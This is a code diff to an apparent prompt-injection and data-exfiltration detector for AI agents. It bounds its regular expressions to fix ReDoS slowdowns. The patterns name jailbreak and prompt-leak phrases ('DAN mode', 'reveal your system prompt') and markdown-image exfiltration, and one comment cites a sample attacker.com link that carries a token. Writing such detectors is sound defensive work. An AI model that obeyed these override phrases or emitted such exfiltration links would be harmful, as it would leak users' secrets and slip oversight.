@@ -94,7 +94,9 @@ const INJECTION_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
   { name: "hidden_instruction", pattern: /HIDDEN_PROMPT|HIDDEN_INSTRUCTION|INVISIBLE_TEXT/i },
   { name: "jailbreak", pattern: /jailbreak|DAN\s*mode|developer\s+mode|unrestricted\s+mode/i },
   { name: "bypass_safety", pattern: /bypass\s+(?:security|safety|filters|restrictions|guardrails)/i },
-  { name: "instruction_delimiter", pattern: /={3,}\s*(?:SYSTEM|INSTRUCTIONS?|BEGIN)\s*={3,}/i },
+  // Bounded — unbounded ={3,}/\s* was severely quadratic-time (8.7s at
+  // 50KB) on long runs of "=" with no SYSTEM/INSTRUCTIONS/BEGIN literal.
+  { name: "instruction_delimiter", pattern: /={3,20}\s{0,10}(?:SYSTEM|INSTRUCTIONS?|BEGIN)\s{0,10}={3,20}/i },
   { name: "prompt_leak_request", pattern: /(?:print|show|reveal|output)\s+(?:your|the|system)\s+(?:prompt|instructions)/i },
   { name: "base64_injection", pattern: /(?:decode|eval|execute)\s+(?:the\s+)?(?:following\s+)?base64/i },
   // Passive instruction-void forms (CSS-hidden, HTML-attr, and plain text injections)
@@ -149,11 +151,20 @@ const EXFILTRATION_PATTERNS: Array<{ name: string; pattern: RegExp }> = [
   // (![img](https://attacker.com/log?token=...) went undetected) — for a
   // security-relevant pattern, restoring recall takes priority over the
   // narrower, lower-severity CDN false positive.
-  { name: "markdown_image_exfil", pattern: /!\[.*?\]\(https?:\/\/[^)]*\?[^)]*(?:token|key|secret|data|q|payload|p|prompt|ctx|context|info|msg|body|session|conv)=/i },
+  // Bounded — unbounded form was quadratic-time ReDoS (4s+ at 160KB) on
+  // content with many "![" substrings and no closing ")".
+  // Bounds widened from an earlier, tighter pass (300/500/300) after review
+  // found real alt-text >300 chars would otherwise slip past undetected —
+  // 2000/1000/500 stays under 60ms even at 50KB of adversarial input (the
+  // guards' own default maxContentLength), so there's no need to trade
+  // detection reach for the ReDoS fix.
+  { name: "markdown_image_exfil", pattern: /!\[.{0,2000}?\]\(https?:\/\/[^)]{0,1000}\?[^)]{0,500}(?:token|key|secret|data|q|payload|p|prompt|ctx|context|info|msg|body|session|conv)=/i },
   // "Reprompt"-style exfil (CVE-2026-24307): markdown image with any long query-param value (≥30 chars).
-  { name: "markdown_image_exfil_long_value", pattern: /!\[.*?\]\(https?:\/\/[^)]+\?[^)]*=[^)&]{30,}/ },
+  // Bounded — same ReDoS shape as markdown_image_exfil above.
+  { name: "markdown_image_exfil_long_value", pattern: /!\[.{0,2000}?\]\(https?:\/\/[^)]{1,1000}\?[^)]{0,500}=[^)&]{30,}/ },
   // Markdown exfil using URL-encoded path separators (%2F=/,  %5C=\) in query values
-  { name: "markdown_image_exfil_urlenc", pattern: /!\[.*?\]\(https?:\/\/[^)]+\?[^)]*=[^)]*%(?:2[Ff]|5[Cc])/i },
+  // Bounded — same ReDoS shape as markdown_image_exfil above.
+  { name: "markdown_image_exfil_urlenc", pattern: /!\[.{0,2000}?\]\(https?:\/\/[^)]{1,1000}\?[^)]{0,500}=[^)]{0,500}%(?:2[Ff]|5[Cc])/i },
   { name: "tracking_pixel", pattern: /<img[^>]+src=["']https?:\/\/[^"']*\?[^"']*["'][^>]*(?:width|height)\s*=\s*["']?[01]px/i },
   { name: "encoded_url_exfil", pattern: /https?:\/\/[^\s]*(?:callback|webhook|exfil|collect)[^\s]*\?[^\s]*(?:data|payload|d)=/i },
   { name: "data_send_instruction", pattern: /send\s+(?:this|the|all)\s+(?:data|information|content|context)\s+to/i },
